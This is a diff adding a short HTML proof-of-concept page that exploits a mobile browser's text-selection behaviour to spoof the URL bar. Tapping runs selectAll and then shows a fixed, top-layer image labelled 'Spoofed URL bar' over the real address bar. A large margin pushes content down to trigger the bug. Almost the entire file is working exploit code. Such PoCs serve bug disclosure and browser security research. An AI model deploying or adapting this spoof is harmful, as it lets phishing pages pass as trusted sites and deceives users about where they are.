@@ -1,0 +1,61 @@
+<html onmousedown="rfsSelectAll()" onclick="selectAllChildren()">
+
+<head>
+    <title>PoC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden; /* Prevents scrolling */
+        }
+        #spoof {
+            display: none;
+            position: fixed; /* Changed to fixed for better positioning */
+            top: 0;
+            left: 0;
+            width: 100%;
+            z-index: 999999; /* Ensure it's on top */
+        }
+        #content-wrapper {
+            margin-top: 9999px; /* Pushes the paragraph way down */
+        }
+    </style>
+</head>
+
+<body>
+    <!-- This image will overlay the URL bar -->
+    <img id="spoof" src="spoof.png" alt="Spoofed URL bar">
+
+    <!-- This invisible image pushes the content down, helping to trigger the bug -->
+    <div id="content-wrapper">
+         <p id="paragraph1">
+            Tap anywhere on the screen.
+            <br><br>
+            A[=
+            ?:TLv
+            S9y
+        </p>
+    </div>
+
+    <script>
+        function rfsSelectAll() {
+            // This command triggers the text selection menu
+            document.execCommand("selectAll");
+            // This makes the spoofed image visible
+            document.getElementById("spoof").style.display = "block";
+        }
+
+        function selectAllChildren() {
+            // Further ensures the text remains selected
+             if (document.getSelection) { // W3C
+                document.getSelection().selectAllChildren(
+                    document.getElementById('paragraph1')
+                );
+            }
+        }
+    </script>
+
+</body>
+</html>
